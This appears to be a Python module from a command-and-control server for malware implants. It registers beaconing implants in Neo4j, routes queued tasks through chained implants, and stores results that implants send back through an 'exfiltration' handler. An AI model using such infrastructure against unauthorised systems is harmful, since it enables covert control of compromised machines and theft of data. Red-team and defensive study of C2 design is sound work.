import msgpack
import structlog

from ..db.neo4j_functions import Neo4jChainingService, Neo4jImplantNodeService
from ..db.redis_functions import RedisImplantTaskService

core_logger = structlog.get_logger("core_handler")


def _register_new_implant(unpacked_metadata: dict, external_ip: str, listener_uuid: str):
    """
    Handles the creation of a new implant in Neo4j.
    """
    core_logger.info("New implant connected")

    # extract external ip from the listener that called this
    unpacked_metadata["external_ip"] = external_ip
    # seed default sleep_value matching the C++ implant default (sleep_time=5)
    unpacked_metadata.setdefault("sleep_value", 5)

    implant_uuid = unpacked_metadata.get("implant_uuid")
    if not implant_uuid:
        core_logger.warning("New implant came in without a UUID", unpacked_metadata=unpacked_metadata)
        return

    # create in neo4j
    # implant_node = Neo4jImplantNodeService(
    #     implant_uuid=implant_uuid,
    #     listener_uuid=listener_uuid,
    # )
    # pass ALL metadata to host
    Neo4jImplantNodeService.register_node(listener_uuid=listener_uuid, **unpacked_metadata)


def handle_beacon(data_from_implant: bytes, external_ip: str, listener_uuid: str) -> bytes | None:
    """
    Processes an incoming beacon (GET check-in).
    Registers the implant if needed, gathers tasks for it and its children,
    and returns a msgpack array of tasks (or None if no tasks).
    """
    task_list = []

    try:
        implant_get_request_array = msgpack.unpackb(data_from_implant)
    except Exception as e:
        core_logger.error("metadata_validation_failed", error=str(e))
        raise ValueError("Malformed msgpack data") from e

    # Loop over the check-ins
    for implant_get_request in implant_get_request_array:
        implant_uuid = implant_get_request.get("implant_uuid", "")
        core_logger.info("Extracted metadata in metadata list on GET", metadata=implant_get_request)

        if not implant_uuid:
            core_logger.warning(
                "Task came in without an implant_uuid, discarding", implant_get_request=implant_get_request
            )
            continue

        implant_data_in_db = Neo4jImplantNodeService.get_by_uuid(implant_uuid)

        # Register if the node doesn't exist OR if it's a bare placeholder.
        if not implant_data_in_db or not implant_data_in_db.get("system_hostname"):
            core_logger.info("Registering new implant or populating placeholder", implant_uuid=implant_uuid)
            _register_new_implant(implant_get_request, external_ip, listener_uuid)

        Neo4jImplantNodeService.update_last_checkin(implant_uuid)

    # find the egress node of one of the implant UUID's
    one_of_the_uuids_from_checkin = implant_get_request_array[0].get("implant_uuid")
    egress_uuid = Neo4jChainingService.find_egress_node_in_chain(one_of_the_uuids_from_checkin)

    # get the list of all children attached to egress
    children = Neo4jChainingService.get_children_of_parent(parent_uuid=egress_uuid)

    # get tasks for all children
    for child in children:
        child_uuid = child.get("implant_uuid", "")
        if not child_uuid:
            continue

        its = RedisImplantTaskService(child_uuid)
        msgpack_task = its.dequeue_task()

        if not msgpack_task:
            continue

        task_for_implant = msgpack.unpackb(msgpack_task)
        task_list.append(task_for_implant)

    # make sure the parent gets tasks for itself
    its = RedisImplantTaskService(implant_uuid=egress_uuid)
    msgpack_task = its.dequeue_task()
    if msgpack_task:
        task_for_implant = msgpack.unpackb(msgpack_task)
        task_list.append(task_for_implant)

    # Catch the empty queue BEFORE unpacking
    if not task_list:
        core_logger.info("checkin_no_task")
        return None

    core_logger.info("final task list", task_list=task_list)

    # convert task list back to msgpack
    return msgpack.packb(task_list)


def handle_exfil(data_from_implant: bytes) -> None:
    """
    Processes incoming task responses (POST exfiltration).
    Splits the array of responses and routes each to the correct Redis queue.
    """
    try:
        task_response_list: list[dict] = msgpack.unpackb(data_from_implant)
    except Exception as e:
        core_logger.error("post_output_unpack_error", error=str(e))
        raise ValueError("Malformed msgpack data") from e

    core_logger.info("Received tasks from implant", tasks=task_response_list)

    for unpacked_task_response in task_response_list:
        _implant_uuid = unpacked_task_response.get("implant_uuid", "")
        _task_uuid = unpacked_task_response.get("task_uuid", "")

        if not _implant_uuid:
            core_logger.warning("Task came back without an implant_uuid", task=unpacked_task_response)
            continue

        packed_response = msgpack.packb(unpacked_task_response)

        rits = RedisImplantTaskService(_implant_uuid)
        rits.enqueue_response(packed_response)

        core_logger.info("task response stored in redis", implant_uuid=_implant_uuid, task_uuid=_task_uuid)
